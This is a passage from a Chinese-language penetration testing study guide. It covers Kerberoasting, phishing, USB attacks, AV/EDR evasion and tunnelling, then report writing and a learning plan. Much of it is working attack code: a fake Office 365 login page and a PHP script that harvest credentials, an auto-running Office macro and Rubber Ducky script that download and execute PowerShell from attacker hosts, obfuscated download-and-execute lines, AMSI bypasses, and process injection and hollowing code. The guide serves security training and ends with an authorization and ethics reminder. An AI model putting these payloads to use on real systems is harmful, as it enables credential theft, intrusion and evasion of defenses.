# 访问共享
dir \\server\c$
```

**Kerberoasting**:
```bash
# 请求服务票据
GetUserSPNs.py -request -dc-ip 192.168.1.10 domain.com/user:password

# 离线破解
hashcat -m 13100 tgs_ticket.hash wordlist.txt

# John the Ripper
john --wordlist=wordlist.txt tgs_ticket.hash
```

---

## 6. 社会工程学攻击

### 6.1 钓鱼攻击

#### 邮件钓鱼

**SET（Social-Engineer Toolkit）**:
```bash
# 启动SET
setoolkit

# 选择1: Social-Engineering Attacks
# 选择1: Spear-Phishing Attack Vectors
# 选择1: Perform a Mass Email Attack

# 配置邮件模板
# 添加目标邮箱
# 设置SMTP服务器
```

**Gophish钓鱼平台**:
```bash
# 安装Gophish
wget https://github.com/gophish/gophish/releases/download/v0.11.0/gophish-v0.11.0-linux-64bit.zip
unzip gophish-v0.11.0-linux-64bit.zip
./gophish

# 访问Web界面
https://localhost:3333

# 创建钓鱼活动
1. 创建用户组（导入目标邮箱）
2. 创建邮件模板
3. 创建钓鱼页面
4. 配置发送配置
5. 启动活动
```

**自定义钓鱼页面**:
```html
<!DOCTYPE html>
<html>
<head>
    <title>Office 365 Login</title>
    <style>
        /* 仿造Office 365登录页面 */
    </style>
</head>
<body>
    <form action="https://attacker.com/harvest.php" method="POST">
        <input type="email" name="email" placeholder="Email" required>
        <input type="password" name="password" placeholder="Password" required>
        <button type="submit">Sign in</button>
    </form>
</body>
</html>
```

**凭证收集脚本**:
```php
<?php
// harvest.php
$email = $_POST['email'];
$password = $_POST['password'];

// 记录凭证
file_put_contents('credentials.txt',
    date('Y-m-d H:i:s') . " | $email | $password\n",
    FILE_APPEND);

// 重定向到真实网站
header('Location: https://login.microsoftonline.com');
?>
```

#### Office宏钓鱼

**恶意宏生成**:
```vba
Sub AutoOpen()
    ExecutePayload
End Sub

Sub Document_Open()
    ExecutePayload
End Sub

Sub ExecutePayload()
    Dim objShell As Object
    Set objShell = CreateObject("WScript.Shell")

    ' PowerShell反弹Shell
    objShell.Run "powershell.exe -NoP -W Hidden -Exec Bypass -Command ""IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')""", 0, False
End Sub
```

**使用msfvenom生成宏**:
```bash
msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.100 LPORT=443 -f vba

# 复制输出的VBA代码到Word文档宏编辑器
# 配置自动执行
```

### 6.2 物理渗透

#### USB攻击

**Rubber Ducky脚本**:
```
REM Windows快速反弹Shell
DELAY 1000
GUI r
DELAY 500
STRING powershell -W Hidden -NoP -Exec Bypass IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.100/payload.ps1')
ENTER
```

**BadUSB攻击**:
```c
// Arduino Leonardo模拟键盘
#include <Keyboard.h>

void setup() {
    Keyboard.begin();
    delay(1000);

    // Win+R
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press('r');
    Keyboard.releaseAll();
    delay(500);

    // 执行命令
    Keyboard.print("powershell -W Hidden -NoP");
    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();

    Keyboard.end();
}

void loop() {
}
```

#### WiFi Pineapple

**Evil Twin攻击**:
```bash
# 创建假AP
# 诱导用户连接
# 中间人攻击
# 凭证收集
```

---

## 7. 防御规避技术

### 7.1 AV/EDR绕过

#### 混淆技术

**PowerShell混淆**:
```powershell
# 字符串拼接
$a = 'I' + 'E' + 'X'
& $a (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')

# Base64编码
$command = 'IEX (New-Object Net.WebClient).DownloadString("http://evil.com/payload.ps1")'
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encoded = [Convert]::ToBase64String($bytes)
powershell.exe -EncodedCommand $encoded

# XOR加密
function Invoke-Obfuscation {
    param($code, $key)
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($code)
    for($i=0; $i -lt $bytes.Length; $i++) {
        $bytes[$i] = $bytes[$i] -bxor $key
    }
    return $bytes
}
```

**Invoke-Obfuscation工具**:
```powershell
Import-Module .\Invoke-Obfuscation.psd1
Invoke-Obfuscation

# 加载脚本
SET SCRIPTBLOCK IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')

# 应用混淆
TOKEN
ALL
1

# 输出混淆后的代码
```

#### AMSI绕过

```powershell
# 方法1: 内存Patch
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# 方法2: 反射修改
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)

# 方法3: 编码绕过
$a = 'System.Management.Automation.A';$b = 'msiUtils'
$c = [Ref].Assembly.GetType($a+$b)
$d = $c.GetField('amsiInitFailed','NonPublic,Static')
$d.SetValue($null,$true)
```

#### 进程注入

**经典注入技术**:
```c
#include <windows.h>

// 1. OpenProcess - 打开目标进程
HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPID);

// 2. VirtualAllocEx - 分配内存
LPVOID remoteBuffer = VirtualAllocEx(hProcess, NULL, sizeof(shellcode),
                                     MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

// 3. WriteProcessMemory - 写入shellcode
WriteProcessMemory(hProcess, remoteBuffer, shellcode, sizeof(shellcode), NULL);

// 4. CreateRemoteThread - 执行
HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
                                    (LPTHREAD_START_ROUTINE)remoteBuffer,
                                    NULL, 0, NULL);

WaitForSingleObject(hThread, INFINITE);
CloseHandle(hThread);
CloseHandle(hProcess);
```

**Process Hollowing**:
```c
// 1. 创建挂起的进程
STARTUPINFO si = {sizeof(si)};
PROCESS_INFORMATION pi;
CreateProcess("C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE,
              CREATE_SUSPENDED, NULL, NULL, &si, &pi);

// 2. 卸载原进程内存
NtUnmapViewOfSection(pi.hProcess, pImageBase);

// 3. 分配新内存
VirtualAllocEx(pi.hProcess, pImageBase, dwImageSize,
               MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

// 4. 写入恶意代码
WriteProcessMemory(pi.hProcess, pImageBase, pMaliciousCode, dwImageSize, NULL);

// 5. 设置入口点
SetThreadContext(pi.hThread, &ctx);

// 6. 恢复进程
ResumeThread(pi.hThread);
```

### 7.2 流量混淆

#### 域前置（Domain Fronting）

```python
# 使用CDN进行流量混淆
import requests

headers = {
    'Host': 'allowed-domain.com'  # CDN允许的域名
}

# 实际请求到攻击者的服务器
response = requests.get('https://cdn.provider.com/path', headers=headers)
```

#### DNS隧道

**dnscat2**:
```bash
# 服务端
dnscat2-server yourdomain.com

# 客户端
./dnscat yourdomain.com
```

**iodine**:
```bash
# 服务端
iodined -f -c -P password 10.0.0.1 tunnel.yourdomain.com

# 客户端
iodine -f -P password tunnel.yourdomain.com

# 使用隧道
ssh user@10.0.0.1
```

---

## 8. 渗透测试报告编写

### 8.1 报告结构

**执行摘要**（面向管理层）:
```markdown
# 执行摘要

## 测试概述
- 测试对象: XXX公司信息系统
- 测试时间: 2024年1月1日 - 2024年1月15日
- 测试类型: 外部黑盒渗透测试
- 测试人员: 安全团队

## 主要发现
- 发现严重漏洞: 5个
- 发现高危漏洞: 12个
- 发现中危漏洞: 23个
- 发现低危漏洞: 15个

## 风险总结
1. 数据泄露风险: 存在SQL注入漏洞可导致数据库完全泄露
2. 系统入侵风险: 存在未修补的远程代码执行漏洞
3. 权限提升风险: 多个系统存在本地权限提升漏洞

## 建议优先级
1. 立即处理: SQL注入、RCE漏洞（1-3天）
2. 短期处理: 权限提升、信息泄露（1-2周）
3. 中期处理: 配置问题、弱密码（1个月）
```

**技术细节**（面向技术团队）:
```markdown
# 漏洞详情

## 漏洞1: SQL注入漏洞

### 基本信息
- 漏洞名称: SQL注入漏洞
- 风险等级: 严重
- CVSS评分: 9.8
- 影响系统: Web应用服务器 (192.168.1.10)
- 影响URL: https://target.com/product.php?id=1

### 漏洞描述
在产品查询接口发现SQL注入漏洞，攻击者可通过构造恶意SQL语句获取数据库中的敏感信息，
包括用户账号、密码哈希、个人信息等。

### 复现步骤
1. 访问 https://target.com/product.php?id=1
2. 修改id参数为: 1' OR '1'='1
3. 观察页面返回所有产品信息
4. 使用UNION注入提取数据库名称
5. 继续提取表结构和数据

### 技术细节
**请求示例**:
```http
GET /product.php?id=1' UNION SELECT 1,database(),user(),version()-- HTTP/1.1
Host: target.com
```

**响应内容**:
```
Database: production_db
User: web_user@localhost
Version: MySQL 5.7.34
```

**SQLMap验证**:
```bash
sqlmap -u "https://target.com/product.php?id=1" --dbs
# 成功获取数据库列表
```

### 影响评估
- 数据泄露: 可获取数据库中10万+用户敏感数据
- 数据篡改: 可修改产品价格、库存等信息
- 权限提升: 可能通过UDF提权获取服务器权限
- 影响用户: 全部注册用户（100,000+）

### 修复建议

**立即措施**:
1. 禁用受影响的页面
2. 开启WAF规则拦截SQL注入

**长期方案**:
1. 使用参数化查询（Prepared Statement）
2. 实施严格的输入验证
3. 最小权限原则配置数据库账户
4. 定期安全代码审计

**修复代码示例**:
```php
// 不安全的代码
$id = $_GET['id'];
$query = "SELECT * FROM products WHERE id = '$id'";

// 安全的代码（使用PDO）
$stmt = $pdo->prepare("SELECT * FROM products WHERE id = ?");
$stmt->execute([$id]);
```

### 验证方法
1. 代码审计确认使用参数化查询
2. 使用SQLMap再次测试
3. 手工测试各种注入payload
4. 持续监控WAF日志

### 参考资料
- OWASP SQL Injection: https://owasp.org/www-community/attacks/SQL_Injection
- CWE-89: SQL注入: https://cwe.mitre.org/data/definitions/89.html
```

### 8.2 风险评级

**CVSS评分标准**:
```
严重 (Critical): 9.0-10.0
高危 (High):      7.0-8.9
中危 (Medium):    4.0-6.9
低危 (Low):       0.1-3.9
```

**风险矩阵**:
```
         影响程度
        低  中  高  严重
可
能 高  中  高  高  严重
性 中  低  中  高  高
   低  低  低  中  中
```

---

## 9. 学习验证标准

### ✅ 阶段一：基础建立（1-2个月）
- [ ] 掌握信息收集的各种方法和工具
- [ ] 能够使用Nmap进行全面的网络扫描
- [ ] 理解常见Web漏洞的原理和利用
- [ ] 熟练使用Burp Suite和Metasploit
- [ ] 完成DVWA所有级别挑战

### ✅ 阶段二：技能提升（3-4个月）
- [ ] 能够编写简单的漏洞利用脚本
- [ ] 掌握缓冲区溢出基本原理
- [ ] 熟练进行Windows和Linux提权
- [ ] 能够绕过基础的防御措施
- [ ] 完成HackTheBox 20台靶机

### ✅ 阶段三：实战应用（5-6个月）
- [ ] 独立完成完整渗透测试项目
- [ ] 编写专业的渗透测试报告
- [ ] 开发自定义渗透工具
- [ ] 参与漏洞赏金计划
- [ ] 通过OSCP/CEH认证

---

## 10. 实战环境推荐

### 在线靶场
- **HackTheBox**: 真实环境渗透平台
- **TryHackMe**: 引导式学习平台
- **PentesterLab**: 专业渗透测试训练
- **VulnHub**: 可下载的靶机
- **PortSwigger Web Security Academy**: Web安全免费课程

### 本地搭建

**Web应用靶场**:
```bash
# DVWA
docker run --rm -it -p 80:80 vulnerables/web-dvwa

# bWAPP
docker run -d -p 80:80 raesene/bwapp

# OWASP Juice Shop
docker run -p 3000:3000 bkimminich/juice-shop

# WebGoat
docker run -p 8080:8080 -t webgoat/goatandwolf
```

**系统靶场**:
```
Metasploitable2/3
Windows 7/10测试虚拟机
Vulnhub靶机系列
```

---

## 11. 扩展学习资源

### 📚 推荐书籍
1. **《Metasploit渗透测试指南》** - 框架实战
2. **《Web应用安全权威指南》** - Web漏洞深度
3. **《黑客攻防技术宝典：系统实战篇》** - 系统渗透
4. **《灰帽黑客》** - 漏洞利用技术

### 🎓 在线课程
- Offensive Security: OSCP/OSEP/OSWE
- SANS: GPEN/GWAPT/GXPN
- eLearnSecurity: eJPT/eCPPT
- Pentester Academy: 各类专项课程

### 🔧 必备工具

**信息收集**:
```
nmap, masscan, amass, subfinder,
theHarvester, recon-ng
```

**Web渗透**:
```
Burp Suite, OWASP ZAP, SQLMap,
XSStrike, Nikto, WPScan
```

**系统渗透**:
```
Metasploit, Empire, Covenant,
Mimikatz, CrackMapExec
```

**密码破解**:
```
Hashcat, John the Ripper, Hydra,
Medusa, Patator
```

**后渗透**:
```
PowerSploit, PowerView, BloodHound,
Impacket, Evil-WinRM
```

### 📰 安全资讯
- **FreeBuf**: 国内安全资讯
- **Hack The Box Blog**: 靶机writeup
- **PortSwigger Research**: Web安全研究
- **0day.today**: 漏洞数据库
- **Exploit-DB**: 漏洞利用代码库

---

## 12. 职业发展路径

### 初级渗透测试工程师（0-2年）
- 熟练使用主流渗透工具
- 掌握OWASP Top 10漏洞
- 能够完成基础渗透测试
- 编写标准化测试报告

### 中级渗透测试工程师（2-5年）
- 独立完成复杂渗透项目
- 掌握多种漏洞利用技术
- 能够绕过常见安全防护
- 参与安全产品研发

### 高级渗透测试专家（5年以上）
- APT攻击模拟和演练
- 0day漏洞挖掘和利用
- 红蓝对抗策略制定
- 团队管理和技术培训

---

## 13. 90天速成计划

### Month 1: 基础建设
**Week 1-2**:
- 信息收集技术
- Nmap全面学习
- OSINT实战

**Week 3-4**:
- Web漏洞原理
- Burp Suite实战
- SQL注入深入

### Month 2: 技能提升
**Week 5-6**:
- 系统渗透技术
- Metasploit框架
- 权限提升实战

**Week 7-8**:
- 无线网络渗透
- 社会工程学
- 物理渗透

### Month 3: 综合实战
**Week 9-10**:
- 后渗透技术
- 横向移动
- 防御规避

**Week 11-12**:
- 完整项目实战
- 报告编写
- 认证考试准备

---

## ⚠️ 安全提醒

1. **合法授权**: 所有渗透测试必须获得书面授权
2. **数据保护**: 妥善保管测试中获取的敏感数据
3. **最小影响**: 避免对生产环境造成破坏
4. **负责披露**: 发现漏洞后通过正规渠道报告
5. **持续学习**: 安全技术不断发展，保持学习热情
6. **道德准则**: 技术用于防御，而非攻击和破坏

---

## 📝 总结

服务器渗透测试是一个综合性极强的安全领域，需要掌握网络、系统、应用等多方面知识。本指南提供了系统化的学习路径，但真正的技能提升需要：

1. **扎实基础**: 深入理解TCP/IP、操作系统、Web技术
2. **大量实践**: 通过靶场和实战项目积累经验
3. **持续研究**: 关注最新漏洞和攻击技术
4. **工具精通**: 熟练使用各类渗透工具
5. **思维培养**: 培养攻击者和防御者双重思维
6. **法律意识**: 严格遵守法律法规和职业道德

记住：优秀的渗透测试工程师不仅是技术专家，更是具有高度责任感和职业道德的安全从业者。

---

**文档版本**: v2.0
**最后更新**: 2024年1月
**维护者**: Penetration Testing Team
**反馈邮箱**: security@example.com (请替换为实际邮箱)
